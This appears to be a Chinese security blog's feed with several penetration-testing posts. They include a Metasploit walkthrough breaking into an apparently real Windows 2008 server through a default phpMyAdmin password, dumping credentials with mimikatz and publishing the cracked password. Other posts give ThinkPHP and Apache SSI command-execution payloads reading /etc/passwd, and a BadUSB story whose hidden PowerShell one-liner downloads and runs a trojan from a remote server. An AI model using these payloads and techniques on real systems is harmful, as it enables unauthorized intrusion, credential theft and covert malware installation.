src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/528.png" alt="图片"></p><p><code>0xd3d</code>转换为十进制就是<code>3389</code></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 后渗透 </tag>
            
            <tag> RedTeam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit提权Windows_Server_2008服务器</title>
      <link href="/2019/10/29/penetrationtest-7/"/>
      <url>/2019/10/29/penetrationtest-7/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=868830&auto=1&height=66"></iframe><h2 id="渗透前期"><a href="#渗透前期" class="headerlink" title="渗透前期"></a>渗透前期</h2><p>这边是通过进入<code>phpMyAdmin</code>利用日志写一句话得到了一个<code>WebSHELL</code></p><p>至于如何写一句话可以看我之前写的文章:<a href="http://www.liuwx.cn/phpMyAdmin-1.html">phpMyAdmin利用日志文件GetSHELL</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/507.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/508.png" alt="图片"></p><p>他是用<code>phpStudy</code>搭建的网站，默认会有<code>phpMyAdmin</code>，而且密码是默认账号密码，然后你懂的！在这里说一下使用<code>phpStudy</code>搭建网站后一点要更改<code>phpMyAdmin</code>的密码，不然就凉凉.</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li>查看当前用户权限</li></ul><p><code>whoami</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/509.png" alt="图片"></p><p>渗透也是需要运气的，这边是一个<code>administrator</code>权限</p><ul><li>查看有那些用户</li></ul><p><code>net user</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/510.png" alt="图片"></p><p>这边看到这服务器没被搞过，还没得其他用户，只有一个<code>administrator</code>,紧接着我直接上<code>MSF</code>.</p><h2 id="Metasploit对Windows2008提权"><a href="#Metasploit对Windows2008提权" class="headerlink" title="Metasploit对Windows2008提权"></a>Metasploit对Windows2008提权</h2><ul><li>生成正向Paylaod</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9090 -f exe &gt;apachd.exe</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/511.png" alt="图片"></p><p>这边是上传到了<code>C盘</code>下的<code>WinRAR</code>目录，之所以没上传网站根目录后是怕管理员看到就凉凉咯.</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/512.png" alt="图片"></p><p>因为我们生成的<code>Payload</code>是正向，就得需要<code>2008(被攻击者)</code>来连接我们的<code>MSF</code>:</p><ul><li>查看ip地址</li></ul><p><code>ipconfig</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/513.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/514.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/515.png" alt="图片"></p><p>反弹得到了一个会话</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/516.png" alt="图片"></p><p><code>getsystem</code>直接得到<code>SYSTEM</code>系统权限！</p><p>接着是查看他的端口</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/517.png" alt="图片"></p><p>没有开<code>3389</code>,然后开Windows 2008的3389的<code>dos</code>命令是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">命令行强制开启3389服务支持server2008和2003</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where(__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where(TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line">3.reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p>这边是用<code>MSF</code>的<code>run getgui -e</code>开启<code>3389</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run getgui -e</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.</span><br><span class="line">[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]</span><br><span class="line">[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator</span><br><span class="line">[*] Carlos Perez carlos_perez@darkoperator.com</span><br><span class="line">[*] Enabling Remote Desktop</span><br><span class="line">[*] RDP is already enabled</span><br><span class="line">[*] Setting Terminal Services service startup mode</span><br><span class="line">[*] The Terminal Services service is not set to auto, changing it to auto ...</span><br><span class="line">[*] Opening port in local firewall if necessary</span><br><span class="line">[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20191029.2445.rc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/518.png" alt="图片"></p><p>但是查看开放的端口并没有<code>3389</code>，这就脑壳痛了，他应该是改了端口！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/519.png" alt="图片"></p><p>然后找到了他的远程登录端口:<code>15351</code></p><p>这个时候利用<code>MSF</code>自带的<code>mimikatz</code>来读取管理员<code>hash</code>:</p><p><code>load mimikatz</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/520.png" alt="图片"></p><p><code>wdigest</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/521.png" alt="图片"></p><p>获取到了管理员密码，那个admin是我创建的隐藏用户</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/523.png" alt="图片"></p><p>然后用<code>f063a302</code>密码登录不上去我日，估计有缓存md，然后我去解密<code>hash</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/522.png" alt="图片"></p><p><code>fuckyou5201314</code>???WTF?这密码真牛皮！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/524.png" alt="图片"></p><p>提权就到此为止！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Metasploit </tag>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站路径信息搜集大法</title>
      <link href="/2019/10/25/penetrationtest-6/"/>
      <url>/2019/10/25/penetrationtest-6/</url>
      
        <content type="html"><![CDATA[<h2 id="信息搜集前言"><a href="#信息搜集前言" class="headerlink" title="信息搜集前言"></a>信息搜集前言</h2><p>再我们渗透测试过程中，<code>信息搜集</code>无非是最重要的环节!在有的时候我们需要知道网站的<code>绝对路径</code>,下面我总结了几点查看网站路径的方法</p><h3 id="错误页面爆网站路径"><a href="#错误页面爆网站路径" class="headerlink" title="错误页面爆网站路径"></a>错误页面爆网站路径</h3><h4 id="phpMyAdmin报错路径"><a href="#phpMyAdmin报错路径" class="headerlink" title="phpMyAdmin报错路径"></a>phpMyAdmin报错路径</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/495.png" alt="图片"></p><h4 id="SQL注入点报路径"><a href="#SQL注入点报路径" class="headerlink" title="SQL注入点报路径"></a>SQL注入点报路径</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/493.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">单引号报错路径</span><br><span class="line">www.liuwx.cn/news.php?id=1&#x27;</span><br><span class="line"></span><br><span class="line">错误参数值爆路径</span><br><span class="line">www.liuwx.cn/news.php?id=-1</span><br></pre></td></tr></table></figure><h4 id="nginx文件类型错误解析爆路径"><a href="#nginx文件类型错误解析爆路径" class="headerlink" title="nginx文件类型错误解析爆路径"></a>nginx文件类型错误解析爆路径</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx文件类型错误解析爆路径</span><br><span class="line">www.liuwx.cn/hack.jpg/x.php</span><br></pre></td></tr></table></figure><h3 id="配置文件读取网站路径"><a href="#配置文件读取网站路径" class="headerlink" title="配置文件读取网站路径"></a>配置文件读取网站路径</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/494.png" alt="图片"></p><h4 id="Xampp套件"><a href="#Xampp套件" class="headerlink" title="Xampp套件"></a>Xampp套件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Xampp文件路径</span><br><span class="line">C:\xampp\htdocs</span><br><span class="line"></span><br><span class="line">httpd.com配置文件</span><br><span class="line">C:\xampp\apache\conf/httpd.conf</span><br><span class="line"></span><br><span class="line">vhosts.conf虚拟主机</span><br><span class="line">C:\xampp\apache\onf\extra\httpd-vhosts.conf</span><br></pre></td></tr></table></figure><h4 id="phpnow套件"><a href="#phpnow套件" class="headerlink" title="phpnow套件"></a>phpnow套件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">网站默认路径</span><br><span class="line">D:\PHPnow-1.5.6\htdocs</span><br><span class="line"></span><br><span class="line">httpd.conf配置文件</span><br><span class="line">D:\PHPnow-1.5.6\Apache-20\conf\httpd.conf</span><br><span class="line"></span><br><span class="line">vhosts.conf虚拟主机</span><br><span class="line">D:\PHPnow-1.5.6\Apache-20\conf\extra\vhosts.conf</span><br></pre></td></tr></table></figure><h4 id="phpstudy套件"><a href="#phpstudy套件" class="headerlink" title="phpstudy套件"></a>phpstudy套件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">网站默认路径</span><br><span class="line">C:\phpstudy\www</span><br><span class="line"></span><br><span class="line">httpd.conf配置文件</span><br><span class="line">C:\phpStudy\Apache\conf\httpd.conf</span><br><span class="line"></span><br><span class="line">vhosts.conf虚拟主机</span><br><span class="line">C:\phpStudy\Apache\conf\extra\httpd-vhosts.conf</span><br></pre></td></tr></table></figure><h4 id="LAMPP套件"><a href="#LAMPP套件" class="headerlink" title="LAMPP套件"></a>LAMPP套件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">网站默认路径</span><br><span class="line">/opt/lampp/htdocs</span><br><span class="line"></span><br><span class="line">httpd.conf配置文件</span><br><span class="line">/opt/lampp/etc/httpd.conf</span><br><span class="line"></span><br><span class="line">vhosts.conf虚拟主机</span><br><span class="line">/opt/lampp/etc/extra/httpd-vhosts.conf</span><br></pre></td></tr></table></figure><h3 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h3><h4 id="利用Mysql内置函数"><a href="#利用Mysql内置函数" class="headerlink" title="利用Mysql内置函数"></a>利用Mysql内置函数</h4><p>但是这个对于<code>Mysql</code>数据库有版本限制，当前用户还得拥有<code>file</code>权限的前提下</p><p><code>load_file()</code>和<code>load data infile()</code>方法为：<br>新建一个表，读取文件为<code>字符串</code>格式插入表中，然后读出表中数据。<code>load_file()</code>也可以直接读取文件内容</p><p>system cat函数读取<br>httpd.conf、vhosts.conf<br>select load_file(“D:/xampp/apache/conf/httpd.conf”);</p><h3 id="phpinfo函数"><a href="#phpinfo函数" class="headerlink" title="phpinfo函数"></a>phpinfo函数</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/491.png" alt="图片"></p><h4 id="httpd-conf配置文件指定"><a href="#httpd-conf配置文件指定" class="headerlink" title="httpd.conf配置文件指定"></a>httpd.conf配置文件指定</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/492.png" alt="图片"></p><h4 id="DocumentRoot"><a href="#DocumentRoot" class="headerlink" title="DocumentRoot"></a>DocumentRoot</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/492.png" alt="图片"></p><h4 id="Document-Root参数"><a href="#Document-Root参数" class="headerlink" title="Document_Root参数"></a>Document_Root参数</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/490.png" alt="图片"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>本章就到这，再次强调一遍：信息搜集真的很重要！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>诸神之眼-Nmap-使用指南</title>
      <link href="/2019/10/18/Nmap-1/"/>
      <url>/2019/10/18/Nmap-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Nmap简介"><a href="#Nmap简介" class="headerlink" title="Nmap简介"></a>Nmap简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/480.png" alt="图片"></p><p>Nmap，也就是Network Mapper，最早是Linux下的网络扫描和嗅探工具包。</p><p>Nmap是一款网络扫描和主机检测的非常有用的工具。 Nmap是不局限于仅仅收集信息和枚举，同时可以用来作为一个漏洞探测器或安全扫描器。它可以适用于winodws,linux,mac等操作系统。Nmap是一款非常强大的实用工具,可用于：</p><ul><li>检测活在网络上的主机（主机发现）</li><li>检测主机上开放的端口（端口发现或枚举）</li><li>检测到相应的端口（服务发现）的软件和版本</li><li>检测操作系统，硬件地址，以及软件版本</li><li>检测脆弱性的漏洞（Nmap的脚本）</li></ul><h2 id="Nmap安装"><a href="#Nmap安装" class="headerlink" title="Nmap安装"></a>Nmap安装</h2><blockquote><p><a href="https://nmap.org/">https://nmap.org</a></p></blockquote><p>根据自己的操作系统来选择下载的对应版本！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/481.png" alt="图片"></p><p>下载完后会生成一个<code>nmap.exe</code>、<code>zenmap.exe</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/483.png" alt="图片"></p><p><code>nmap.exe</code> 是命令行模式下运行的！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/482.png" alt="图片"></p><p><code>zenmap.exe</code>是图形化下的！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/484.png" alt="图片"></p><p>一般来说使用命令行下的<code>Nmap</code>最好！</p><h2 id="Nmap详细使用手册"><a href="#Nmap详细使用手册" class="headerlink" title="Nmap详细使用手册"></a>Nmap详细使用手册</h2><h3 id="Nmap扫描原理示意图"><a href="#Nmap扫描原理示意图" class="headerlink" title="Nmap扫描原理示意图"></a>Nmap扫描原理示意图</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/485.png" alt="图片"></p><h3 id="Nmap列举远程机器开放的端口"><a href="#Nmap列举远程机器开放的端口" class="headerlink" title="Nmap列举远程机器开放的端口"></a>Nmap列举远程机器开放的端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe scanme.nmap.org</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/486.png" alt="图片"></p><p>从上图可知，目标开放了<code>22</code>,<code>80</code>,<code>9929</code>,<code>31337</code>端口</p><ul><li><p>PORT<br>指的是开放的端口</p></li><li><p>STATE<br>指的是状态<br><code>Open</code><br>表示端口处于<code>开放</code>状态<br><code>Closed</code><br>表示端口处于<code>关闭</code>状态<br><code>Filterd</code><br>表示端口处于过滤无法收到返回的<code>Probe</code>状态<br><code>Opend/UnFilterd</code><br>表示端口处于<code>开放</code>或者是<code>过滤</code>状态<br><code>Closed/UnFilterd</code><br>表示端口处于<code>关闭</code>或者<code>未过滤</code>状态</p></li><li><p>SERVICE<br>指的是端口对应的服务</p></li></ul><p><code>nmap</code>进行探测之前要吧域名通过<code>DNS</code>服务器解析为<code>IP</code>地址，我们也可以通过指定的<code>DNS</code>服务器进行解析！</p><h3 id="使用指定的DNS服务器进行解析扫描"><a href="#使用指定的DNS服务器进行解析扫描" class="headerlink" title="使用指定的DNS服务器进行解析扫描"></a>使用指定的DNS服务器进行解析扫描</h3><p>有的时候，我们需要来指定<code>DNS</code>服务器来进行探测，因为有些域名的公司的架设使用的解析是谷歌的<code>DNS</code>，这样我们指定了就会扫描的更仔细一些</p><blockquote><p>–dns-servers</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --dns-servers 8.8.8.8 scanme.nmap.org</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/487.png" alt="图片"></p><p>从上图可以看到，我们指定了谷歌的<code>DNS</code>来对域名解析扫描：</p><h3 id="躲避防火墙安全机制进行扫描探测"><a href="#躲避防火墙安全机制进行扫描探测" class="headerlink" title="躲避防火墙安全机制进行扫描探测"></a>躲避防火墙安全机制进行扫描探测</h3><p>对于已经知道主机存活或者防火墙开启的机器，可以使用<code>-Pn</code>来停止探测之前的<code>ICMP</code>请求，已达到不触发防火墙安全机制。</p><blockquote><p>-Pn</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -Pn scanme.nmap.org</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/488.png" alt="图片"></p><h2 id="Nmap对一个端口范围进行扫描探测"><a href="#Nmap对一个端口范围进行扫描探测" class="headerlink" title="Nmap对一个端口范围进行扫描探测"></a>Nmap对一个端口范围进行扫描探测</h2><p>对于默认的端口范围，并不能满足日常的工作需要；可以使用<code>-p m-n</code>来指定探测端口访问为<code>m-n</code>之间的所有端口</p><blockquote><p>-p m-n</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">探测1-1000范围内的端口情况</span><br><span class="line">nmap.exe -p 1-1000 scanme.nmap.org</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/489.png" alt="图片"></p><p>未完待续</p>]]></content>
      
      
      <categories>
          
          <category> 武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali Linux </tag>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp5 5.0.22 / 5.1.29远程执行代码漏洞复现</title>
      <link href="/2019/10/17/ThinkPHP-2/"/>
      <url>/2019/10/17/ThinkPHP-2/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>2018年12月10日中午，thinkphp官方公众号发布了一个更新通知，包含了一个<code>5.x</code>系列所有版本存在被getshell的高风险漏洞。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/475.png" alt="图片"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>结合官方公告说的由于对控制器名没有足够的检测，再查看官方<code>git commit</code>信息</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/476.png" alt="图片"></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="通过phpinfo函数写出phpinfo-的信息"><a href="#通过phpinfo函数写出phpinfo-的信息" class="headerlink" title="通过phpinfo函数写出phpinfo()的信息"></a>通过phpinfo函数写出phpinfo()的信息</h3><p>POC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过phpinfo函数写出phpinfo()的信息</span><br><span class="line">index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/477.png" alt="图片"></p><h3 id="利用system函数远程命令执行"><a href="#利用system函数远程命令执行" class="headerlink" title="利用system函数远程命令执行"></a>利用system函数远程命令执行</h3><p>POC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用system函数远程命令执行读取/etc/passwd</span><br><span class="line">index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/478.png" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> CVE </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache SSI 远程命令执行漏洞复现</title>
      <link href="/2019/10/16/Apache-3/"/>
      <url>/2019/10/16/Apache-3/</url>
      
        <content type="html"><![CDATA[<h2 id="SSI简介"><a href="#SSI简介" class="headerlink" title="SSI简介"></a>SSI简介</h2><p>SSI（服务器端包含）是​​放置在HTML页面中的指令，并在服务页面时在服务器上对其进行评估。它们使您可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。</p><p>例如，您可以将指令放置到现有的HTML页面中，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;</span><br></pre></td></tr></table></figure><p>并且，当该页面被投放时，该片段将被评估并替换为其值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tuesday, 15-Jan-2013 19:28:54 EST</span><br></pre></td></tr></table></figure><h2 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/469.png" alt="图片"></p><p>这边是来到了一个上传点，我先上传一个<code>php</code>文件看看能不能上传：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/470.png" alt="图片"></p><p><code>Unsupported filetype uploaded.</code>很明显，不能上传<code>php</code>!</p><p>那么我们就可以用<code>SSI</code>的特性来上传一个<code>shtml</code>文件</p><p>其中内容是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;whoami&quot; --&gt;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/471.png" alt="图片"></p><p>然后我们打开刚刚上传的<code>cmd.stml</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/472.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/473.png" alt="图片"></p><p><code>Response</code>返回：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 16 Oct 2019 11:53:49 GMT</span><br><span class="line">Server: Apache/2.4.25 (Debian)</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure><h3 id="读取passwd文件"><a href="#读取passwd文件" class="headerlink" title="读取passwd文件"></a>读取passwd文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot; --&gt;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/474.png" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache </tag>
            
            <tag> 漏洞原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>看我如何通过一枚U盘打击黑产分子，劝他改邪归正的</title>
      <link href="/2019/10/16/penetrationtest-5/"/>
      <url>/2019/10/16/penetrationtest-5/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=17423740&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某天下午，一个人加我找我做<code>BadUSB</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/464.jpg" alt="图片"></p><p>问他做BadUsb用来干嘛，他说用来窃取资料（至于窃取啥我也不晓得）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/465.jpg" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/466.jpg" alt="图片"></p><p>通过看他朋友圈得知这逼是搞黑产的，我日，原来是黑产分子啊，必须盘他！</p><blockquote><p>下面是我劝他改邪归正的过程，兄台，这可是你亲自找我的啊</p></blockquote><h2 id="社工过程"><a href="#社工过程" class="headerlink" title="社工过程"></a>社工过程</h2><p>这边是用一个<code>Badusb Leonardo</code>,然后按照他要求，做了一个窃取<code>D盘</code>下的<code>kao</code>文件夹下的内容!</p><p>我跟他说具体原理就是使用<code>Powershell</code>给远端服务器上传文件!这逼还怕我骗他…</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/469.jpg" alt="图片"></p><p>完了到7点我做好了，你既然怕我骗你，那么我就骗你吧，来一个声东击西！其实我写的脚本就是打开<code>cmd</code>执行我写好的<code>python</code>脚本，用python脚本远程上传到服务器！还好那逼不懂，不然就露馅了…然后我就做好了发了个视频给他看</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/467.jpg" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/468.jpg" alt="图片"></p><p>钱到手！我还白赚500块?</p><h2 id="Metasploit生成远控"><a href="#Metasploit生成远控" class="headerlink" title="Metasploit生成远控"></a>Metasploit生成远控</h2><p>利用一个晚上的时间，我做了一个假的上传文件到服务器的<code>BadUsb</code>，具体是插上<code>U盘</code>，在他电脑里输入一大串代码（为了糊弄他）然后执行<code>Powershell</code>远程下载做好的免杀木马并执行(这才是真正目的)，最后执行完会在<code>cmd</code>中打印出<code>文件已上传到某某邮箱</code>（为了让他相信）</p><p><code>Powershell</code>原理如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile(&#x27;http://服务器地址/shell.exe&#x27;,&#x27;shell.exe&#x27;);start-process shell.exe</span><br></pre></td></tr></table></figure><p>具体<code>BadUsb</code>可以看我之前写的文章：</p><p><a 